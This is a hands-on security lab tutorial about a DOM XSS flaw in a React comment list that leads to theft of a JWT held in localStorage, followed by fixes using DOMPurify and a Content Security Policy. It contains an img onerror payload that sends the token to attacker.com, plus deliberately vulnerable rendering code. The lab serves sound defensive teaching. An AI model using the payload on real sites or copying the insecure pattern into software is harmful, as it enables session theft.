---
title: "06. Hands-On Lab: Exploiting and Securing a React App"
description: "In this lab, we will identify a DOM XSS vulnerability in a React application that leads to the theft of a JWT stored in LocalStorage, and then apply p..."
keywords: ["AppSec", "Cybersecurity", "Security Guide", "Tutorial", "02 Web And Api", "Frontend Security", "06 Hands On Lab.Md"]
---

# 06. Hands-On Lab: Exploiting and Securing a React App

In this lab, we will identify a DOM XSS vulnerability in a React application that leads to the theft of a JWT stored in LocalStorage, and then apply proper remediations.

## 🧪 Scenario

You have been provided with a simple React blog application. Users can leave comments, which are rendered using `dangerouslySetInnerHTML`. The user's authentication token is stored in `localStorage`.

### 🚨 Vulnerable Code (`CommentList.jsx`)

```jsx
import React, { useEffect, useState } from 'react';

function CommentList({ comments }) {
  // Simulate token stored insecurely
  useEffect(() => {
    localStorage.setItem('auth_token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...vulnerable_token');
  }, []);

  return (
    <div>
      <h3>Comments</h3>
      <ul>
        {comments.map((comment, index) => (
          // VULNERABILITY: Unsafe rendering of user input
          <li key={index} dangerouslySetInnerHTML={{ __html: comment.text }} />
        ))}
      </ul>
    </div>
  );
}

export default CommentList;
```

## 💥 The Exploit

An attacker submits the following comment to steal the JWT:

```html
<img src="x" onerror="
  const token = localStorage.getItem('auth_token');
  fetch('https://attacker.com/steal?token=' + token);
">
```

When a victim views the comment, the invalid image `src` triggers the `onerror` event, executing the malicious JavaScript. The script reads the token from `localStorage` and sends it to the attacker's server.

## 🛡️ Remediation

We will implement two layers of defense: sanitizing the input and enforcing a Strict CSP.

### Step 1: Sanitize with DOMPurify

Update `CommentList.jsx` to use `dompurify`.

```jsx
import React, { useEffect } from 'react';
import DOMPurify from 'dompurify';

function CommentList({ comments }) {
  useEffect(() => {
    // In a real app, move tokens to HttpOnly cookies or memory!
    localStorage.setItem('auth_token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...vulnerable_token');
  }, []);

  return (
    <div>
      <h3>Comments</h3>
      <ul>
        {comments.map((comment, index) => {
          // REMEDIATION: Sanitize the input before rendering
          const cleanHTML = DOMPurify.sanitize(comment.text);
          return <li key={index} dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
        })}
      </ul>
    </div>
  );
}

export default CommentList;
```

### Step 2: Implement Strict CSP

Add a meta tag (or preferably an HTTP response header) to enforce a Strict Content Security Policy. This prevents inline scripts (like our `onerror` payload) from executing.

```html
<!-- In index.html -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';">
```
*Note: A true strict CSP would use nonces for scripts, but blocking `unsafe-inline` is the first critical step.*

With the CSP in place, even if the sanitization fails (e.g., an evasion technique is found), the browser will block the execution of the inline `onerror` script, rendering the exploit ineffective.
